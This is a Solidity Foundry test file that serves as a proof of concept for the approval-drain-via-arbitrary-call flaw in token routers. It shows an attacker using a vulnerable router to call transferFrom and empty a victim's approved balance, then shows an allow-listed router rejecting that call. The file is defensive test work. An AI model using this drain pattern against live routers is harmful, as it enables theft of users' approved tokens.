// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {VulnerableRouter, SafeRouter} from "../src/approval-drain/Router.sol";

/// PoC for the approval-drain-via-arbitrary-external-call class (Seneca/Socket/Sushi, $M).
///   forge test --match-contract ApprovalDrain -vvv
///
/// Invariant (SC05/SC01): a router holding user approvals must never forward an
/// attacker-chosen call — the standing allowance must only reach trusted adapters.
/// Vulnerable router lets the attacker call `token.transferFrom(victim, attacker, …)`;
/// an adapter allow-list holds.
///
/// See docs/exploits/approval-drain-arbitrary-call-2024-02.md
contract ApprovalDrainTest is Test {
    MockERC20 token;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    uint256 constant VICTIM_BAL = 1_000e18;

    function setUp() public {
        token = new MockERC20();
        token.mint(victim, VICTIM_BAL);
    }

    function _drainCalldata() internal view returns (bytes memory) {
        // token.transferFrom(victim, attacker, VICTIM_BAL)
        return abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", victim, attacker, VICTIM_BAL
        );
    }

    function test_vulnerableRouter_drainsApproval() public {
        VulnerableRouter router = new VulnerableRouter();

        // Victim approves the router for swaps (the standing approval routers rely on).
        vm.prank(victim);
        token.approve(address(router), type(uint256).max);

        // Attacker forwards an arbitrary call: the token's own transferFrom.
        vm.prank(attacker);
        router.execute(address(token), _drainCalldata());

        assertEq(token.balanceOf(attacker), VICTIM_BAL, "attacker drained victim's approval");
        assertEq(token.balanceOf(victim), 0, "victim emptied");
    }

    function test_safeRouter_rejectsArbitraryTarget() public {
        address[] memory adapters = new address[](1);
        adapters[0] = makeAddr("trustedDexAdapter");
        SafeRouter router = new SafeRouter(adapters);

        vm.prank(victim);
        token.approve(address(router), type(uint256).max);

        vm.prank(attacker);
        vm.expectRevert(bytes("target not allow-listed"));
        router.execute(address(token), _drainCalldata());

        assertEq(token.balanceOf(victim), VICTIM_BAL, "victim funds untouched");
    }
}
